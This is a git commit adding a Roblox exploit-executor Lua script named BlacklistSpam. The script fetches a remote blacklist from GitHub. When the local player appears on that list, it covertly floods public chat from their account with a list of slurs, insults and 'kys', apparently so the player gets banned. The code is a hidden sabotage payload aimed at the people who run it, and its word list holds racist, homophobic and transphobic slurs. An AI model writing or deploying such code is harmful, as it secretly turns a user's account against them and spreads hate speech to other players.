733b0224407df50d69c11a9fe7a724ad3ebeb7fc
SmokeXDev <111679379+SmokeXDev@users.noreply.github.com>
2023-10-20 20:39:18 +0200

    Create BlacklistSpam.lua

---
+++ BlacklistSpam.lua
@@ -0,0 +1,63 @@
+local http_request = syn and syn.request or request;
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local BlacklistUsers = http_request({Url = "https://raw.githubusercontent.com/SmokeXDev/SmokeUsers/main/Blacklist.json", Method = 'GET'}).Body;
+local blacklisted = game:GetService("HttpService"):JSONDecode(BlacklistUsers)
+local BadWords = {
+    "gay",
+    "lesbian",
+    "retard",
+    "noob",
+    "clown",
+    "no life",
+    "wizard",
+    "report",
+    "father",
+    "mother",
+    "dumb",
+    "stupid",
+    "cringe",
+    "parent",
+    "kid",
+    "ugly",
+    "child",
+    "trash",
+    "bozo",
+    "kys",
+    "die",
+    "killyou",
+    "loser",
+    "black",
+    "white",
+    "negro",
+    "nivver",
+    "negar",
+    "bad",
+    "worst",
+    "fat",
+    "hack",
+    "exploit",
+    "cheat",
+    "download",
+    "yt",
+    "trans",
+    "lgbt"
+}
+
+for playerName, kickInfo in pairs(blacklisted) do
+    local blacklistedplr = Players:FindFirstChild(playerName)
+    if blacklistedplr == Players.LocalPlayer then
+        if game:GetService("TextChatService").ChatVersion == Enum.ChatVersion.TextChatService then
+            while true do
+                task.wait()
+                for _, BadWord in ipairs(BadWords) do
+                    game:GetService("TextChatService").ChatInputBarConfiguration.TargetTextChannel:SendAsync(BadWord)
+                end
+            end
+        elseif game:GetService("TextChatService").ChatVersion == Enum.ChatVersion.LegacyChatService then
+            for _, BadWord in ipairs(BadWords) do
+                ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer(BadWord, "All")
+            end
+        end        
+    end
+end
